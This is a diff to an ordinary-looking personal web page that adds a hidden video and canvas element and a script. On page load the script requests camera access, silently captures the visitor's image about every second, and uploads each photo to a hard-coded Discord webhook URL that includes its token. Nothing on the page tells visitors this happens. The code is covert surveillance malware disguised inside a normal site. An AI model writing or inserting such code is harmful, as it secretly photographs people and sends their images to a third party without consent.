@@ -479,7 +479,8 @@ table{
 
   <h4 style="color:white"><pre>© Developed by <a style="color:#FFE4E1" href="https://www.facebook.com/mdmehedialhasansawon">Mehedi Al Hasan Sawon</pre> </a></h4>
     </footer>
-
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <script>
         function showContent(page) {
             const contentDiv = document.getElementById('content');
@@ -616,8 +617,54 @@ displayQuote();
 
     // Event listener for notification button click
     document.getElementById("notificationBtn").addEventListener("click", openPopupp);
-  </script>
 
+//capture//
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let captureInterval;
+
+        // Access the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+                startAutoCapture(); // Start capturing images automatically
+            })
+            .catch((error) => {
+                console.error("Error accessing the camera", error);
+            });
+
+        // Function to capture photo and send to Discord
+        function capturePhoto() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'captured_image.png');
+
+                // Sending the photo to Discord via Webhook
+                fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Successfully sent to Discord');
+                    } else {
+                        console.error('Error sending to Discord:', response.statusText);
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error sending to Discord:', error);
+                });
+            }, 'image/png');
+        }
+
+        // Start automatic photo capture every 5 seconds
+        function startAutoCapture() {
+            captureInterval = setInterval(capturePhoto, 1000);  // Capture every 5 seconds
+        }
+    </script>
 
     </script>
 </body>
